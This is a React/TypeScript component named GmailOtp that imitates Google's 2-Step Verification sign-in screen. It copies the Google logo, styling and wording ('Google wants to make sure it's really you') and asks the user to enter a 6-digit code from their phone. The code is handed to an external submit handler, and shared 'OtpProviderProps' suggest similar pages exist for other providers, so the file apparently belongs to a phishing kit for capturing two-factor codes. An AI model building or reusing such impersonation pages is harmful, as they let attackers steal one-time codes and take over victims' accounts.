import React, { useState } from 'react';
import Spinner from '../common/Spinner';
import { OtpProviderProps } from './otpUtils';

const GmailOtp: React.FC<OtpProviderProps> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => {
  const [gmailCodeValue, setGmailCodeValue] = useState('');

  const handleGmailCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setGmailCodeValue(val);
    onOtpComplete(val);
  };

  return (
  <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', fontFamily: "'Google Sans', 'Roboto', Arial, sans-serif" }}>
    <div className="w-full max-w-md rounded-lg border border-gray-200 p-8 md:p-10" style={{ boxShadow: '0 1px 3px rgba(0,0,0,0.08)' }}>
      <div className="text-center mb-6">
        <svg viewBox="0 0 272 92" className="mx-auto h-6 mb-6" xmlns="http://www.w3.org/2000/svg">
          <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
          <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
          <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
          <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
          <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
        </svg>
        <h1 className="text-2xl font-normal text-gray-800 mb-2">2-Step Verification</h1>
        <p className="text-sm text-gray-600">
          To help keep your account safe, Google wants to make sure it's really you trying to sign in
        </p>
        {email && <p className="text-sm text-blue-600 mt-3 font-medium">{email}</p>}
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
        <div className="flex items-start gap-3">
          <svg className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
          <div>
            <p className="text-sm font-medium text-gray-800">Check your phone</p>
            <p className="text-xs text-gray-600 mt-0.5">A verification code has been sent to your device. Enter the 6-digit code below.</p>
          </div>
        </div>
      </div>

      <form onSubmit={onSubmit} className="space-y-6">
        {errorMessage && (
          <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
            <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
            <span>{errorMessage}</span>
          </div>
        )}

        <div>
          <label className="text-sm font-medium text-gray-700 block mb-2">Enter code</label>
          <input
            type="text"
            inputMode="numeric"
            autoComplete="one-time-code"
            placeholder="Enter code"
            value={gmailCodeValue}
            onChange={handleGmailCodeChange}
            disabled={isLoading}
            autoFocus
            className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:outline-none disabled:bg-gray-100"
            style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
          />
        </div>

        <div className="flex justify-between items-center pt-2">
          <button type="button" className="text-sm font-medium text-blue-600 hover:text-blue-800 transition-colors">Try another way</button>
          <button type="submit" disabled={isLoading || otp.length < 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] hover:bg-[#1557B0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
            {isLoading ? 'Verifying...' : 'Next'}
          </button>
        </div>
      </form>

      <div className="mt-8 pt-4 border-t border-gray-100 flex items-center justify-center gap-4 text-xs text-gray-500">
        <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Help</a>
        <a href="https://accounts.google.com/TOS" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
        <a href="https://accounts.google.com/TOS" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
      </div>
    </div>
  </div>
  );
};

export default GmailOtp;
